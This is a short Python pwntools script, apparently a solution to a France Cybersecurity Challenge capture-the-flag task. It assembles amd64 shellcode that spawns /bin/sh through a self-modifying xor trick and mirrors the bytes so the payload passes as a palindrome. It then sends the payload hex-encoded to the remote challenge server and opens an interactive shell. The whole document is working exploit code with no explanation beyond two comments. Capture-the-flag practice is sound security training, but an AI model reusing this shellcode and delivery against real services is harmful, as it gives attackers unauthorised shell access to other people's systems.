from pwn import *
import binascii

context.update(arch="amd64", os="linux")


shellc = asm('''
   mov al,59
   lea rdi,cmd[rip]
   xor byte ptr[rdi-2],al
   .byte 0xd0,30
cmd:
   .string "/bin/sh"
''')

print('shellcode length: '+str(len(shellc)))
print(hexdump(shellc))
# add the shellcode in reverse order, to make it looks like a correct palindrome..
SC = shellc+shellc[::-1]

p = remote('challenges.france-cybersecurity-challenge.fr', '2054')
# send the shellcode encoded to hexadecimal
p.sendlineafter('):\n', binascii.hexlify(SC)  )

p.interactive()
